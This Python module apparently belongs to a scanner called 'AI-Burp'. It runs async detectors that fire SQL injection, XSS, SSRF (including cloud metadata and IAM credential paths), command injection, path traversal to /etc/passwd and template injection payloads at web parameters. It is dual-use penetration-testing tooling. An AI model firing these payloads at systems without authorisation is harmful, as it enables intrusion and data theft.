"""
AI-Burp V3 Unified Detectors
统一漏洞检测器 (异步 + 丰富 Payload)

合并自:
- detectors_v3.py: 异步架构
- detectors.py (v2): 丰富的 payload 和错误模式
"""

import asyncio
import re
import urllib.parse
from typing import Dict, List, Any, Optional, Tuple
from dataclasses import dataclass, field
from .constants import SQL_ERRORS


# ============================================================
#                        数据结构
# ============================================================

@dataclass
class Finding:
    """检测发现"""
    vuln_type: str          # sqli, xss, ssrf, cmdi, lfi, ssti
    confidence: str         # high, medium, low
    evidence: str           # 证据
    payload: str            # 触发的 payload
    details: Dict = field(default_factory=dict)
    
    def __str__(self):
        return f"[{self.confidence.upper()}] {self.vuln_type}: {self.evidence}"


@dataclass
class DiscoveredParam:
    """发现的参数"""
    url: str
    param: str
    value: str
    method: str  # GET or POST
    source: str  # url, form, link


@dataclass
class DiscoveredForm:
    """发现的表单"""
    action: str
    method: str
    params: Dict[str, str]


# ============================================================
#                     异步检测器基类
# ============================================================

class BaseDetector:
    """异步检测器基类"""
    def __init__(self, burp):
        self.burp = burp
        self.findings: List[Finding] = []
    
    async def detect(self, url: str, param: str, value: str) -> List[Finding]:
        raise NotImplementedError


# ============================================================
#                     SQL 注入检测器
# ============================================================

class SQLiDetector(BaseDetector):
    """异步 SQL 注入检测器 (增强版)"""
    
    # 扩展错误模式 (合并自 V2)
    ERROR_PATTERNS = {
        "mysql": [
            r"SQL syntax.*MySQL", r"Warning.*mysql_", r"Warning.*mysqli_",
            r"MySqlException", r"valid MySQL result", r"You have an error in your SQL syntax",
        ],
        "php_mysql": [
            r"mysqli_\w+\(\) expects parameter", r"mysqli_query\(\):.*failed",
            r"PDOException", r"SQLSTATE\[\w+\]",
        ],
        "postgresql": [
            r"PostgreSQL.*ERROR", r"pg_query", r"pg_\w+\(\) expects parameter",
            r"ERROR:\s+syntax error at or near",
        ],
        "mssql": [
            r"Microsoft.*ODBC", r"SQL Server", r"Unclosed quotation mark",
            r"Incorrect syntax near", r"ODBC SQL Server Driver",
        ],
        "oracle": [r"ORA-\d{5}", r"Oracle.*Driver", r"quoted string not properly terminated"],
        "sqlite": [r"SQLite.*error", r"sqlite3_", r"SQLITE_ERROR"],
        "access": [r"Microsoft JET Database Engine", r"Syntax error in string in query expression"],
        "generic": [r"syntax error", r"unterminated", r"SQL command not properly ended"],
    }
    
    async def detect(self, url: str, param: str, value: str) -> List[Finding]:
        self.findings = []
        
        # 1. 获取基线 (并行 3 次取平均)
        tasks = [self.burp._send_param(url, param, value, "GET") for _ in range(3)]
        baselines = await asyncio.gather(*tasks)
        baselines = [b for b in baselines if b.ok]
        
        if not baselines:
            return []
        
        avg_baseline_time = sum(b.time_ms for b in baselines) / len(baselines)
        main_baseline = baselines[0]

        # 2. 并发错误检测 (扩展 payload)
        error_payloads = [
            "'", '"', "')", "'))", "' OR '1'='1", "1 AND 1=2",
            "1'1", "\\", "1;--", "1'/**/AND/**/'1'='1",
        ]
        tasks = [self.burp._send_param(url, param, f"{value}{p}", "GET") for p in error_payloads]
        responses = await asyncio.gather(*tasks)
        
        for i, r in enumerate(responses):
            db_type = self._check_error(r.body)
            if db_type:
                self.findings.append(Finding(
                    vuln_type="sqli",
                    confidence="high",
                    evidence=f"发现 {db_type} 错误信息",
                    payload=error_payloads[i],
                    details={"db_type": db_type, "snippet": r.body[:200]}
                ))

        # 3. 并发时间盲注 (扩展 payload)
        time_payloads = [
            ("'; WAITFOR DELAY '0:0:3'--", "mssql"),
            ("' AND SLEEP(3)--", "mysql"),
            ("\" AND SLEEP(3)--", "mysql"),
            ("' AND pg_sleep(3)--", "postgresql"),
            ("' AND BENCHMARK(5000000,SHA1('x'))--", "mysql"),
            (f"{value} AND SLEEP(3)", "mysql"),
        ]
        tasks = [self.burp._send_param(url, param, p[0], "GET") for p in time_payloads]
        responses = await asyncio.gather(*tasks)
        
        for i, r in enumerate(responses):
            if r.time_ms > avg_baseline_time + 2500:
                self.findings.append(Finding(
                    vuln_type="sqli_time",
                    confidence="high",
                    evidence=f"时间延迟 {r.time_ms - avg_baseline_time:.0f}ms",
                    payload=time_payloads[i][0],
                    details={"db_type": time_payloads[i][1], "delay_ms": r.time_ms}
                ))

        # 4. 布尔盲注检测
        bool_pairs = [
            (f"{value}' AND '1'='1", f"{value}' AND '1'='2"),
            (f"{value} AND 1=1", f"{value} AND 1=2"),
        ]
        for true_p, false_p in bool_pairs:
            r_true, r_false = await asyncio.gather(
                self.burp._send_param(url, param, true_p, "GET"),
                self.burp._send_param(url, param, false_p, "GET")
            )
            if abs(r_true.length - r_false.length) > 30:
                self.findings.append(Finding(
                    vuln_type="sqli_bool",
                    confidence="medium",
                    evidence=f"布尔差异 {abs(r_true.length - r_false.length)}b",
                    payload=true_p,
                    details={"true_len": r_true.length, "false_len": r_false.length}
                ))

        return self.findings

    def _check_error(self, body: str) -> Optional[str]:
        for db, patterns in self.ERROR_PATTERNS.items():
            for p in patterns:
                if re.search(p, body, re.I):
                    return db
        # 也检查 constants 中的模式
        for db, patterns in SQL_ERRORS.items():
            for p in patterns:
                if re.search(p, body, re.I):
                    return db
        return None


# ============================================================
#                     XSS 检测器
# ============================================================

class XSSDetector(BaseDetector):
    """异步 XSS 检测器"""
    CANARY = "xssv3_7e3f9a"

    async def detect(self, url: str, param: str, value: str) -> List[Finding]:
        self.findings = []
        
        # 1. 探测反射
        r = await self.burp._send_param(url, param, self.CANARY, "GET")
        if self.CANARY not in r.body:
            return []

        # 2. 检测上下文
        context = self._detect_context(r.body)

        # 3. 根据上下文选择 payload
        payloads = self._get_payloads(context)
        
        tasks = [self.burp._send_param(url, param, p, "GET") for p in payloads]
        responses = await asyncio.gather(*tasks)
        
        for i, res in enumerate(responses):
            if self._check_reflection(res.body, payloads[i]):
                self.findings.append(Finding(
                    vuln_type="xss",
                    confidence="high",
                    evidence=f"Payload 反射在 {context} 上下文",
                    payload=payloads[i],
                    details={"context": context}
                ))
        
        return self.findings
    
    def _detect_context(self, body: str) -> str:
        pos = body.find(self.CANARY)
        if pos == -1:
            return "none"
        ctx = body[max(0, pos-100):pos+100]
        if re.search(r'<script[^>]*>[^<]*' + self.CANARY, ctx, re.I):
            return "script"
        elif re.search(r'on\w+\s*=\s*["\'][^"\']*' + self.CANARY, ctx, re.I):
            return "event"
        elif re.search(r'>[^<]*' + self.CANARY, ctx):
            return "html"
        return "attribute"
    
    def _get_payloads(self, context: str) -> List[str]:
        if context == "script":
            return ["</script><script>alert(1)</script>", "';alert(1)//"]
        elif context == "event":
            return ["'-alert(1)-'", "\"onmouseover=alert(1)//"]
        else:
            return [
                "<script>alert(1)</script>",
                "<img src=x onerror=alert(1)>",
                "<svg onload=alert(1)>",
                "\"><img src=x onerror=alert(1)>",
            ]
    
    def _check_reflection(self, body: str, payload: str) -> bool:
        key_parts = ["<script>", "onerror=", "onload=", "javascript:"]
        for part in key_parts:
            if part in payload.lower() and part in body.lower():
                return True
        return payload in body


# ============================================================
#                     SSRF 检测器
# ============================================================

class SSRFDetector(BaseDetector):
    """异步 SSRF 检测器"""
    
    CLOUD_PATTERNS = {
        "aws": ["ami-id", "instance-id", "iam/security-credentials"],
        "gcp": ["computeMetadata", "project-id"],
        "azure": ["vmId", "subscriptionId"],
    }
    
    async def detect(self, url: str, param: str, value: str, oob_domain: str = None) -> List[Finding]:
        self.findings = []
        
        targets = [
            ("http://127.0.0.1", "localhost"),
            ("http://localhost", "localhost"),
            ("http://[::1]", "ipv6_localhost"),
            ("http://169.254.169.254/latest/meta-data/", "aws"),
            ("http://metadata.google.internal/computeMetadata/v1/", "gcp"),
        ]
        
        tasks = [self.burp._send_param(url, param, t[0], "GET") for t in targets]
        responses = await asyncio.gather(*tasks)
        
        for i, r in enumerate(responses):
            if self._check_response(r, targets[i][1]):
                self.findings.append(Finding(
                    vuln_type="ssrf",
                    confidence="high",
                    evidence=f"识别到敏感响应特征: {targets[i][0]}",
                    payload=targets[i][0],
                    details={"target_type": targets[i][1]}
                ))

        if oob_domain:
            payload = f"http://{oob_domain}/ssrf"
            await self.burp._send_param(url, param, payload, "GET")
            self.findings.append(Finding(
                vuln_type="ssrf_oob",
                confidence="low",
                evidence="已发送 OOB 请求，请检查服务器日志",
                payload=payload
            ))

        return self.findings
    
    def _check_response(self, r, target_type: str) -> bool:
        if r.status != 200:
            return False
        if target_type in ["aws", "gcp", "azure"]:
            patterns = self.CLOUD_PATTERNS.get(target_type, [])
            return any(p in r.body for p in patterns)
        return any(s in r.body for s in ["Apache", "nginx", "It works!", "Index of"])


# ============================================================
#                     命令注入检测器
# ============================================================

class CMDiDetector(BaseDetector):
    """异步命令注入检测器"""
    
    async def detect(self, url: str, param: str, value: str) -> List[Finding]:
        self.findings = []
        
        # 获取基线
        baseline = await self.burp._send_param(url, param, value, "GET")
        
        payloads = [
            (f"{value}; sleep 3", "linux"),
            (f"{value} | sleep 3", "linux"),
            (f"{value}`sleep 3`", "linux"),
            (f"{value}$(sleep 3)", "linux"),
            (f"{value}& ping -n 3 127.0.0.1", "windows"),
        ]
        
        tasks = [self.burp._send_param(url, param, p[0], "GET") for p in payloads]
        responses = await asyncio.gather(*tasks)
        
        for i, r in enumerate(responses):
            if r.time_ms > baseline.time_ms + 2500:
                self.findings.append(Finding(
                    vuln_type="cmdi",
                    confidence="high",
                    evidence=f"时间延迟 {r.time_ms - baseline.time_ms:.0f}ms",
                    payload=payloads[i][0],
                    details={"os": payloads[i][1]}
                ))
        
        return self.findings


# ============================================================
#                     LFI 检测器
# ============================================================

class LFIDetector(BaseDetector):
    """异步 LFI 检测器"""
    
    FILE_SIGNATURES = {
        "passwd": r"root:.*:0:0:",
        "win.ini": r"\[fonts\]",
        "hosts": r"127\.0\.0\.1\s+localhost",
    }
    
    async def detect(self, url: str, param: str, value: str) -> List[Finding]:
        self.findings = []
        
        payloads = [
            ("../../../../etc/passwd", "passwd"),
            ("../../../etc/passwd", "passwd"),
            ("/etc/passwd", "passwd"),
            ("..\\..\\..\\windows\\win.ini", "win.ini"),
            ("C:\\Windows\\win.ini", "win.ini"),
            ("php://filter/convert.base64-encode/resource=/etc/passwd", "php_wrapper"),
        ]
        
        tasks = [self.burp._send_param(url, param, p[0], "GET") for p in payloads]
        responses = await asyncio.gather(*tasks)
        
        for i, r in enumerate(responses):
            file_type = payloads[i][1]
            if file_type == "php_wrapper":
                if re.search(r"^[A-Za-z0-9+/=]{50,}$", r.body.strip()):
                    self.findings.append(Finding(
                        vuln_type="lfi",
                        confidence="high",
                        evidence="PHP 源码泄露 (Base64)",
                        payload=payloads[i][0]
                    ))
            else:
                pattern = self.FILE_SIGNATURES.get(file_type, "")
                if pattern and re.search(pattern, r.body):
                    self.findings.append(Finding(
                        vuln_type="lfi",
                        confidence="high",
                        evidence=f"读取到 {file_type} 内容",
                        payload=payloads[i][0]
                    ))
        
        return self.findings


# ============================================================
#                     SSTI 检测器
# ============================================================

class SSTIDetector(BaseDetector):
    """异步 SSTI 检测器"""
    
    TESTS = [
        ("{{7*7}}", "49", "jinja2/twig"),
        ("${7*7}", "49", "freemarker"),
        ("#{7*7}", "49", "ruby/java"),
        ("<%= 7*7 %>", "49", "erb"),
        ("{{7*'7'}}", "7777777", "jinja2"),
    ]
    
    async def detect(self, url: str, param: str, value: str) -> List[Finding]:
        self.findings = []
        
        tasks = [self.burp._send_param(url, param, t[0], "GET") for t in self.TESTS]
        responses = await asyncio.gather(*tasks)
        
        for i, r in enumerate(responses):
            expected = self.TESTS[i][1]
            if expected in r.body and self.TESTS[i][0].replace("7*7", "") not in r.body:
                self.findings.append(Finding(
                    vuln_type="ssti",
                    confidence="high",
                    evidence=f"模板计算结果 {expected}",
                    payload=self.TESTS[i][0],
                    details={"engine": self.TESTS[i][2]}
                ))
        
        return self.findings


# ============================================================
#                     统一扫描器
# ============================================================

class VulnScanner:
    """同步漏洞扫描器 (兼容旧 API)"""
    
    def __init__(self, burp):
        self.burp = burp
        self._async_scanner = AsyncVulnScanner(burp)
    
    def scan_all(self, url: str, param: str, value: str) -> List[Finding]:
        import asyncio
        return asyncio.run(self._async_scanner.scan_all(url, param, value))
    
    def scan(self, url: str, param: str, value: str, types: List[str] = None) -> List[Finding]:
        import asyncio
        return asyncio.run(self._async_scanner.scan(url, param, value, types))


class AsyncVulnScanner:
    """异步综合扫描器"""
    
    def __init__(self, burp):
        self.burp = burp
        self.detectors = {
            "sqli": SQLiDetector(burp),
            "xss": XSSDetector(burp),
            "ssrf": SSRFDetector(burp),
            "cmdi": CMDiDetector(burp),
            "lfi": LFIDetector(burp),
            "ssti": SSTIDetector(burp),
        }

    async def scan_all(self, url: str, param: str, value: str) -> List[Finding]:
        return await self.scan(url, param, value)
    
    async def scan(self, url: str, param: str, value: str, types: List[str] = None) -> List[Finding]:
        if types is None:
            types = list(self.detectors.keys())
        
        tasks = []
        for name in types:
            if name in self.detectors:
                tasks.append(self.detectors[name].detect(url, param, value))
        
        results = await asyncio.gather(*tasks)
        return [item for sublist in results for item in sublist]
    
    def report(self, findings: List[Finding]) -> str:
        if not findings:
            return "未发现漏洞"
        
        lines = [f"发现 {len(findings)} 个潜在漏洞:\n"]
        high = [f for f in findings if f.confidence == "high"]
        medium = [f for f in findings if f.confidence == "medium"]
        
        if high:
            lines.append("🔴 高危:")
            for f in high:
                lines.append(f"  - {f.vuln_type}: {f.evidence}")
                lines.append(f"    Payload: {f.payload}")
        
        if medium:
            lines.append("\n🟡 中危:")
            for f in medium:
                lines.append(f"  - {f.vuln_type}: {f.evidence}")
        
        return "\n".join(lines)
